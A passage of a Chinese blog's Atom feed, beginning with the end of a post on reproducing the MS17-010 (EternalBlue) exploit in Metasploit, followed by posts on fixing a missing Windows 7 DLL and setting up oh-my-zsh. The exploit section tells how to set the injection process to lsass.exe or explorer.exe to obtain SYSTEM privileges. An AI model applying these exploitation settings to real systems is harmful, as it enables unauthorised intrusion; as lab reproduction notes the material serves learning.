<h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>本人菜鸟，记录的都是很简单的一些东西，大牛绕过就可以了，谢谢，欢迎交流。md语法也是一边百度一边用，可能排版不好，请见谅。</p>
<p>参考链接：<a href="https://www.t00ls.net/thread-39584-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-39584-1-1.html</a></p>
<h1 id="纠正"><a href="#纠正" class="headerlink" title="纠正"></a>纠正</h1><p>按照上面的攻击过程获取到的权限一般都是local service \ network service，无法进行提权。问题出现在PROCESSINJECT(注入进程)的设置上。上文中注入的进程是svchost.exe,我们查看进程可以发现svchost.exe有多个进程，分别有local service \ network service \ system三种权限。<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/8.jpg" alt=""></p>
<p>这也就难怪获得的权限是local service \ network service。<br>我们只需将注入进程修改为system / admin权限的进程就OK，例如explorer.exe、lsass.exe等等。为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/5.png" alt=""></p>
<p>或者你可以每次利用时set PROCESSINJECT 进程名 设置即可。<br><img src="http://op2ihgtv7.bkt.clouddn.com/6.png" alt=""></p>
<p>下面是获取到system权限的效果图<br><img src="http://op2ihgtv7.bkt.clouddn.com/7.jpg" alt=""></p>
<h3 id="最后附一张成功图片"><a href="#最后附一张成功图片" class="headerlink" title="最后附一张成功图片"></a>最后附一张成功图片</h3><p>注：原文set target 9要根据实际msf show options来<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fi46qz6kikj214y0mddh3.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.hi-noob.com/20170427/ms17_010/&quot; title=&quot;ms17-010 exp复现&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文:http://www.hi-noob.com/20170427/ms17_010&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前言&lt;/p&gt;
&lt;p&gt;Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yingzhzh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="ms17-010" scheme="http://yingzhzh.github.io/tags/ms17-010/"/>
    
      <category term="永恒之蓝" scheme="http://yingzhzh.github.io/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
  </entry>
  
  <entry>
    <title>win7安装wamp遇到api-ms-win-crt-runtime-l1-1-0.dll丢失问题</title>
    <link href="http://yingzhzh.github.io/2017/08/01/win7sp1-apache/"/>
    <id>http://yingzhzh.github.io/2017/08/01/win7sp1-apache/</id>
    <published>2017-08-01T04:58:22.000Z</published>
    <updated>2017-08-18T07:34:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。</p>
<a id="more"></a> 
<h5 id="1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"><a href="#1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单" class="headerlink" title="1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"></a>1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单</h5><p>但是大部分筒子面临的是安装VC2015失败，比如我。</p>
<h5 id="2-直接下载对应DLL丢到系统盘"><a href="#2-直接下载对应DLL丢到系统盘" class="headerlink" title="2.直接下载对应DLL丢到系统盘"></a>2.直接下载对应DLL丢到系统盘</h5><pre><code>1. 把api-ms-win-crt-runtime-l1-1-0.dll下载到电脑
2. 直接拷贝该文件到系统目录里：C:\Windows\System32目录下，64位系统为：C:\Windows\SysWOW64
3. 最后在开始菜单中找到“运行(R)” 或者按快捷键“Win+R”，在弹出的框内输入“regsvr32 api-ms-win-crt-runtime-l1-1-0.dll”(不含双引号)，回车即可解决错误提示！
</code></pre><p>（此方法我试过，出现提示“无法找到入口”之类，插入方式不对，不能达到高潮。）</p>
<h5 id="3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"><a href="#3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）" class="headerlink" title="3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"></a>3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）</h5><h5 id="4-使用cmd安装"><a href="#4-使用cmd安装" class="headerlink" title="4.使用cmd安装"></a>4.使用cmd安装</h5><p>kb2999226更新程序，然后重装VC2015</p>
<pre><code>1.  按下【Win+R】组合键打开运行，输入 cmd 点击确定打开命令提示符 ；
2.  在命令提示符框中输入：net stop wuauserv 按下回车键，完成后先别急着关闭；
3.  打开运行，输入：%windir% 点击确定打开文件夹；
4.  在打开的该文件夹中找到“SoftwareDistribution”，并删除掉；
5. 切换到命令提示符窗口，输入：net start wuauserv 按下回车键 后即可重新安装kb2999226 补丁了！
</code></pre><p>（此方法我也试过，依然无效）</p>
<h5 id="5-我的问题和成功解决的方法："><a href="#5-我的问题和成功解决的方法：" class="headerlink" title="5.我的问题和成功解决的方法："></a>5.我的问题和成功解决的方法：</h5><p>问题：需要安装kb2999226 x64，但是安装时提示0x80240037错误，无法安装<br>方法：</p>
<pre><code>下载kb2999226更新程序，把kb2999226.msu改为kb2999226.cab，安装程序会变成压缩包；
然后解压缩又出现一个kb2999226.cab的压缩包
Win+R运行cmd
输入dism /online /add-package /packagepath:&quot;路径\kb2999226.cab
强制安装更新，然后再重装VC2015，就成功了
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。&lt;/p&gt;
    
    </summary>
    
      <category term="系统环境" scheme="http://yingzhzh.github.io/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="win7" scheme="http://yingzhzh.github.io/tags/win7/"/>
    
      <category term="走过的坑" scheme="http://yingzhzh.github.io/tags/%E8%B5%B0%E8%BF%87%E7%9A%84%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>如何安装、配置和使用 zsh</title>
    <link href="http://yingzhzh.github.io/2017/08/01/oh-my-zsh/"/>
    <id>http://yingzhzh.github.io/2017/08/01/oh-my-zsh/</id>
    <published>2017-08-01T03:51:11.000Z</published>
    <updated>2017-08-02T05:40:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>如果你用 Mac，就可以直接看下一节<br>如果你用 Redhat Linux，执行：sudo yum install zsh<br>如果你用 Ubuntu Linux，执行：sudo apt-get install zsh<br>如果你用 Windows……去洗洗睡吧。</p>
<a id="more"></a> 
<p>安装完成后设置当前用户使用 zsh：chsh -s /bin/zsh，根据提示输入当前用户的密码就可以了。</p>
<p>安装oh my zsh</p>
<p>首先安装 git，安装方式同上，把 zsh 换成 git 即可。</p>
<p>安装「oh my zsh」可以自动安装也可以手动安装。</p>
<p>自动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</div></pre></td></tr></table></figure></p>
<p>手动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh</div><div class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>都不复杂，安装完成之后退出当前会话重新打开一个终端窗口，你就可以见到这个彩色的提示了：</p>
<h1 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h1><p>zsh 的配置主要集中在用户当前目录的.zshrc里，用 vim 或你喜欢的其他编辑器打开.zshrc，在最下面会发现这么一行字：</p>
<pre><code>#Customize to your needs…
</code></pre><p>可以在此处定义自己的环境变量和别名，当然，oh my zsh 在安装时已经自动读取当前的环境变量并进行了设置，你可以继续追加其他环境变量。</p>
<p>接下来进行别名的设置，我自己的部分配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">alias  xxxx=&quot;ssh root@xx.xx.xx.xx&quot; #快捷ssh登录</div><div class="line"></div><div class="line">alias cls=&apos;clear&apos;</div><div class="line">alias ll=&apos;ls -l&apos;</div><div class="line">alias la=&apos;ls -a&apos;</div><div class="line">alias vi=&apos;vim&apos;</div><div class="line">alias javac=&quot;javac -J-Dfile.encoding=utf8&quot;</div><div class="line">alias grep=&quot;grep --color=auto&quot;</div><div class="line">alias -s html=subl   # 在命令行直接输入后缀为 html 的文件名，会在 subl 中打开</div><div class="line">alias -s rb=subl     # 在命令行直接输入 ruby 文件，会在 subl 中打开</div><div class="line">alias -s py=subl       # 在命令行直接输入 python 文件，会用 subl 中打开，以下类似</div><div class="line">alias -s js=subl</div><div class="line">alias -s c=subl</div><div class="line">alias -s java=subl</div><div class="line">alias -s txt=subl</div><div class="line">alias -s md=subl</div><div class="line">alias -s gz=&apos;tar -xzvf&apos;</div><div class="line">alias -s tgz=&apos;tar -xzvf&apos;</div><div class="line">alias -s zip=&apos;unzip&apos;</div><div class="line">alias -s bz2=&apos;tar -xjvf&apos;</div><div class="line">alias -s jar=&apos;java -jar&apos;</div></pre></td></tr></table></figure></p>
<p>zsh 的牛粪之处在于不仅可以设置通用别名，还能针对文件类型设置对应的打开程序，比如：<br>alias -s html=mate，意思就是你在命令行输入 hello.html，zsh会为你自动打开 TextMat 并读取 hello.html； alias -s gz=’tar -xzvf’，表示自动解压后缀为 gz 的压缩包。</p>
<p>总之，只有想不到，木有做不到，吓尿了吧。<br>设置完环境变量和别名之后，基本上就可以用了，如果你是个主题控，还可以玩玩 zsh 的主题。在 .zshrc 里找到ZSH_THEME，就可以设置主题了，默认主题是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZSH_THEME=”robbyrussell”</div></pre></td></tr></table></figure></p>
<p>oh my zsh 提供了数十种主题，相关文件在~/.oh-my-zsh/themes目录下，你可以随意选择。</p>
<h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>oh my zsh 项目提供了完善的插件体系，相关的文件在~/.oh-my-zsh/plugins目录下，默认提供了100多种，大家可以根据自己的实际学习和工作环境采用，想了解每个插件的功能，只要打开相关目录下的 zsh 文件看一下就知道了。插件也是在.zshrc里配置，找到plugins关键字，你就可以加载自己的插件了，系统默认加载 git ，你可以在后面追加内容，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plugins=(git textmate ruby autojump osx mvn gradle)</div></pre></td></tr></table></figure>
<p>下面简单介绍几个：</p>
<p>1、git：当你处于一个 git 受控的目录下时，Shell 会明确显示 「git」和 branch，如上图所示，另外对 git 很多命令进行了简化，例如 gco=’git checkout’、gd=’git diff’、gst=’git status’、g=’git’等等，熟练使用可以大大减少 git 的命令长度，命令内容可以参考~/.oh-my-zsh/plugins/git/git.plugin.zsh</p>
<p>2、textmate：mr可以创建 ruby 的框架项目，tm finename 可以用 textmate 打开指定文件。</p>
<p>3、osx：tab 增强，quick-look filename 可以直接预览文件，man-preview grep 可以生成 grep手册 的pdf 版本等。</p>
<p>4、autojump：zsh 和 autojump 的组合形成了 zsh 下最强悍的插件，今天我们主要说说这货。</p>
<p>首先安装autojump，如果你用 Mac，可以使用 brew 安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install autojump</div></pre></td></tr></table></figure></p>
<p>如果是 Linux，去下载 autojump 的最新版本，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/joelthelion/autojump.git</div></pre></td></tr></table></figure></p>
<p>解压缩后进入目录，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./install.py</div></pre></td></tr></table></figure></p>
<p>最后把以下代码加入.zshrc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</div></pre></td></tr></table></figure></p>
<p>至此，安装、配置、插件三位一体，终极 Shell 全面登场。退出终端会话重新登录，开始感受 zsh 的训疾如风！</p>
<p>使用 zsh</p>
<p>1、兼容 bash，原来使用 bash 的兄弟切换过来毫无压力，该咋用咋用。</p>
<p>2、强大的历史纪录功能，输入 grep 然后用上下箭头可以翻阅你执行的所有 grep 命令。</p>
<p>3、智能拼写纠正，输入gtep mactalk * -R，系统会提示：zsh: correct ‘gtep’ to ‘grep’ [nyae]? 比妹纸贴心吧，她们向来都是让你猜的……</p>
<p>4、各种补全：路径补全、命令补全，命令参数补全，插件内容补全等等。触发补全只需要按一下或两下 tab 键，补全项可以使用 ctrl+n/p/f/b上下左右切换。比如你想杀掉 java 的进程，只需要输入 kill java + tab键，如果只有一个 java 进程，zsh 会自动替换为进程的 pid，如果有多个则会出现选择项供你选择。ssh + 空格 + 两个tab键，zsh会列出所有访问过的主机和用户名进行补全</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">##在命令前插入 sudo &#123;&#123;&#123;  </div><div class="line">#定义功能  </div><div class="line">sudo-command-line() &#123;  </div><div class="line">[[ -z $BUFFER ]] &amp;&amp; zle up-history  </div><div class="line">[[ $BUFFER != sudo\ * ]] &amp;&amp; BUFFER=&quot;sudo $BUFFER&quot;  </div><div class="line">zle end-of-line                 #光标移动到行末  </div><div class="line">&#125;  </div><div class="line">zle -N sudo-command-line  </div><div class="line">#定义快捷键为： [Esc] [Esc]  </div><div class="line">bindkey &quot;\e\e&quot; sudo-command-line  </div><div class="line">#&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>5、智能跳转，安装了autojump之后，zsh 会自动记录你访问过的目录，通过 j + 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过hadoop-1.0.0目录，输入j hado 即可正确跳转。j –stat 可以看你的历史路径库。</p>
<p>6、目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转。</p>
<p>7、在当前目录下输入 .. 或 … ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。</p>
<p>8、通配符搜索：ls -l <strong>/*</strong>.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件太多就歇菜了。**</p>
<p>9、更强的别名：请参考配置一节。</p>
<p>10、插件支持：请参考插件一节。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装zsh&quot;&gt;&lt;a href=&quot;#安装zsh&quot; class=&quot;headerlink&quot; title=&quot;安装zsh&quot;&gt;&lt;/a&gt;安装zsh&lt;/h1&gt;&lt;p&gt;如果你用 Mac，就可以直接看下一节&lt;br&gt;如果你用 Redhat Linux，执行：sudo yum install zsh&lt;br&gt;如果你用 Ubuntu Linux，执行：sudo apt-get install zsh&lt;br&gt;如果你用 Windows……去洗洗睡吧。&lt;/p&gt;
    
    </summary>
    
      <category term="系统环境" scheme="http://yingzhzh.github.io/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="linux" scheme="http://yingzhzh.github.io/tags/linux/"/>
    
      <category term="shell" scheme="http://yingzhzh.github.io/tags/shell/"/>
    
      <category term="oh-my-zsh" scheme="http://yingzhzh.github.io/tags/oh-my-zsh/"/>
    
      <category term="mac" scheme="http://yingzhzh.github.io/tags/mac/"/>
    
  </entry>
  
</feed>
